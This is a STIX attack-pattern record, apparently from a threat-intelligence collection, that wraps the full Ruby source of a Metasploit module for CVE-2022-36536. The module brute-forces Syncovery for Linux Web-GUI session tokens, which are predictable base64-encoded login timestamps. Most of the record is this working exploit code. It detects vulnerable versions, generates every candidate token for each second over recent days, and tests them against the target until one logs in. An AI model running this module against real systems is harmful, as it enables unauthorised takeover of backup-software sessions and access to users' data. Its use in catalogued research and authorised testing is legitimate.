{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--30e365d4-a52e-4d26-8b77-a69187246c15",
    "created": "2024-08-14T16:29:03.297977Z",
    "modified": "2024-08-14T16:29:03.297982Z",
    "name": "Syncovery For Linux Web-GUI Session Token Brute-Forcer",
    "description": " This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s). By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops. The vulnerability exists, because in Syncovery session tokens are basically just base64(m/d/Y H:M:S) at the time of the login instead of a random token. If a user does not log out (Syncovery v8.x has no logout) session tokens will remain valid until reboot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536.rb",
            "external_id": "syncovery_linux_token_cve_2022_36536.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-36536"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'base64'\nrequire 'date'\nrequire 'json'\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/syncovery_file_sync_backup'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Syncovery For Linux Web-GUI Session Token Brute-Forcer',\n        'Description' => %q{\n          This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI\n          by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s).\n          By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops.\n          The vulnerability exists, because in Syncovery session tokens are basically just base64(m/d/Y H:M:S) at the time\n          of the login instead of a random token.\n          If a user does not log out (Syncovery v8.x has no logout) session tokens will remain valid until reboot.\n        },\n        'Author' => [ 'Jan Rude' ],\n        'References' => [\n          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],\n          ['CVE', '2022-36536']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'DisclosureDate' => '2022-09-06',\n        'DefaultOptions' => {\n          'RPORT' => 8999,\n          'STOP_ON_SUCCESS' => true # One valid session is enough\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943\n        OptInt.new('DAYS', [true, 'Check today and last X day(s) for valid session token', 1]),\n        OptString.new('TARGETURI', [false, 'The path to Syncovery', '/'])\n      ]\n    )\n\n    deregister_options(\n      'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',\n      'NTLM::SendLM', 'NTLM::SendNTLM', 'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',\n      'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername', 'PASSWORD_SPRAY', 'BLANK_PASSWORDS',\n      'USER_FILE', 'USERPASS_FILE', 'PASS_FILE', 'PASSWORD'\n    )\n  end\n\n  def check_host(_ip)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),\n      'method' => 'GET'\n    )\n\n    if res && res.code == 200\n      json_res = res.get_json_document\n      if json_res['isSyncoveryWindows'] == 'false'\n        version = json_res['SyncoveryTitle']&.scan(/Syncovery\\s([A-Za-z0-9.]+)/)&.flatten&.first || ''\n        if version.empty?\n          vprint_warning(\"#{peer} - Could not identify version\")\n          Exploit::CheckCode::Detected\n        elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == Rex::Version.new('9.48')\n          vprint_good(\"#{peer} - Syncovery #{version}\")\n          Exploit::CheckCode::Appears\n        else\n          vprint_status(\"#{peer} - Syncovery #{version}\")\n          Exploit::CheckCode::Safe\n        end\n      else\n        Exploit::CheckCode::Safe\n      end\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def run_host(ip)\n    # Calculate dates\n    days = datastore['DAYS']\n    if days < 0\n      days = 0\n    end\n    dates = []\n    (0..days).each do |day|\n      dates << (Date.today - day).strftime('%m/%d/%Y')\n    end\n    time = DateTime.now.strftime('%H:%M:%S')\n    hrs, min, sec = time.split(':')\n\n    # Create possible session tokens\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new\n    dates.each do |date|\n      (0..hrs.to_i).reverse_each do |hours|\n        (0..min.to_i).reverse_each do |minutes|\n          (0..sec.to_i).reverse_each do |seconds|\n            timestamp = \"#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}\"\n            cred_collection.add_private(Base64.strict_encode64(timestamp).strip)\n          end\n          sec = 59\n        end\n        min = 59\n      end\n      hrs = 23\n    end\n\n    print_status(\"#{peer.strip} - Starting Brute-Forcer\")\n    scanner = Metasploit::Framework::LoginScanner::SyncoveryFileSyncBackup.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      stop_on_success: true, # this will have no effect due to the scanner behaviour when scanning without username\n      connection_timeout: 10\n    )\n\n    scanner.scan! do |result|\n      if result.success?\n        print_good(\"#{peer.strip} - VALID TOKEN: #{result.credential.private}\")\n      else\n        vprint_error(\"#{peer.strip} - INVALID TOKEN: #{result.credential.private}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}